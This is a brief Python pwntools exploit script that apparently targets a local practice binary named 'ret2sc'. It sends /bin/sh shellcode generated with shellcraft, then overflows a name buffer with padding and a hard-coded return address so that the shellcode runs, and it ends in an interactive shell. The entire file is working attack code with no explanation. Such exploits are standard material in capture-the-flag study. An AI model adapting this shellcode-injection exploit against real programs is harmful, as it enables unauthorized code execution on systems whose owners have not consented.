from pwn import *

r  = process('./ret2sc')

context(log_level='debug', arch='amd64', os='linux')
#arch='amd64', 
sc = asm(shellcraft.sh())
print sc

raw_input()
magic = 0x00601060
p = 'a' * 0x18 + p64(magic)

r.recvuntil('message: ')
r.send(sc)

print 'hello \n'
r.recvuntil('name: ')
r.send(p)

r.interactive()
